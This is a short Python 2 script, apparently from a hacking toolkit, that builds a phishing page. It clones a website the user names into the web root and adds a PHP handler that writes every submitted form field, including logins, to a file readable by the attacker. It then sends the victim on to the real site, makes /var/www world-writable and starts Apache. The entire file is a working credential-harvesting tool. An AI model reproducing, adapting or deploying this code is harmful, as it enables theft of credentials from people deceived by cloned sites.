import random
from data import colors
import requests
import os
submitcode = random.randint(00000,99999)
print "Submit-Code"+colors.color.red
print submitcode
id = raw_input(colors.color.end+"Enter Submit-Code : ")
url = raw_input("Enter Website Url : ")
try:
	clone = requests.get(url)
	folder = os.mkdir("/var/www/"+id)
	file=open("/var/www/"+id+"/index.htm","a")
	file.write(clone.text.encode('utf8'))
	file.close()
	password = raw_input("Enter password : ")
	file=open("/var/www/"+id+"/post.php","a")
	file.write("<?php ")
	file.write(" $file = fopen('"+password+".htm' ,'a'); foreach($_POST as $variable => $value) { fwrite($file,$variable); fwrite($file,'[<font color=red>'); 	 fwrite($file,$value); fwrite($file,'</font>]<br>'); } fwrite($file,'<br>');")
	file.write(" fclose($file); ")
	file.write(" header('location:"+url+"'); ")
	file.write(" ?> ")
	file.close()
	print "["+colors.color.green+"Generate phishing........"+colors.color.end+"]"
	os.system("sleep 3")
	print "["+colors.color.green+"Please Wait.............."+colors.color.end+"]"
	os.system("sleep 5")
	os.system("chmod -R 777 /var/www")
	print "Phishing is successfully created at /var/www/"
	print "["+colors.color.green+"Required"+colors.color.end+"] Change ["+colors.color.red+"action=post.php"+colors.color.end+"] in Form"
	change = raw_input("press <enter> to change")
	os.system("nano /var/www/"+id+"/index.htm")
	print "[\033[1;32mSuccessful\033[1;m]"
	print "Your phishing link is http://localhost/"+id+""
	print "Your password link is http://localhost/"+id+"/"+password+".htm"
	confirm = raw_input("\nDo you wanted to start  Apache2 service [yes or no] : ")
	if confirm == "yes" or confirm == "y" or confirm == "Y" or confirm == "Yes" or confirm == "YES" :
		os.system("service apache2 start")
except:
	print "["+colors.color.red+"Error"+colors.color.end+"] check internet connection"
